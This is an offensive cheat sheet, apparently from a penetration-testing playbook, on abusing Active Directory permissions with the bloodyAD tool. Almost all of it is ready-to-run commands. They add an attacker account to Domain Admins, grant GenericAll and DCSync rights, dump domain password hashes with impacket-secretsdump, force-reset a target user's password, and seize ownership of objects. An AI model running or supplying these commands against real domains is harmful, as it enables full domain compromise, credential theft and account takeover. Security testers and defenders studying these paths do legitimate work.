# 08.06 bloodyAD Group Membership DACL Abuse

> Add genericAll, dcsync, writeMembers, or forceChangePassword ACEs as first-class `bloodyAD add` subcommands.

## Overview

bloodyAD directly exposes DACL write operations as subcommands: add genericAll, add dcsync, add writeMembers, add forceChangePassword. These cover the most common AD ACE abuse paths without needing PowerView or LDAP manipulation scripts.

## Steps

- add genericAll: grants GenericAll ACE — gives full control of the target object
- add dcsync: adds the three DS-Replication ACEs to the domain root — enables DCSync
- add writeMembers: grants WriteMembers ACE on a group — allows adding members
- add forceChangePassword: grants ForceChangePassword ACE on a user
- set owner: sets the Owner field — after ownership, can grant any ACE via dacledit
- Always clean up added ACEs with the corresponding remove subcommand

## Commands

### Add self to privileged group (WriteMembers / GenericAll)

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add groupMember "Domain Admins" attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add groupMember "Remote Desktop Users" attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add groupMember "Administrators" attacker
# Remove:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP remove groupMember "Domain Admins" attacker
```

### Grant GenericAll on user or group

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add genericAll targetuser attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add genericAll "Domain Admins" attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add genericAll "CN=Domain Admins,CN=Users,DC=domain,DC=local" attacker
# Remove:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP remove genericAll targetuser attacker
```

### Grant DCSync rights (on domain root)

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add dcsync attacker
# Then dump with secretsdump:
impacket-secretsdump DOMAIN/attacker:'P@ss'@DC_IP -just-dc
```

### Grant ForceChangePassword ACE

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add forceChangePassword targetuser attacker
# Then reset password:
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set password targetuser 'NewPass123!'
```

### Grant WriteMembers on group

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add writeMembers "Domain Admins" attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP add groupMember "Domain Admins" attacker
```

### Set Owner of object

```bash
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set owner targetuser attacker
bloodyAD -u attacker -p pass -d DOMAIN --host DC_IP set owner "Domain Admins" attacker
```
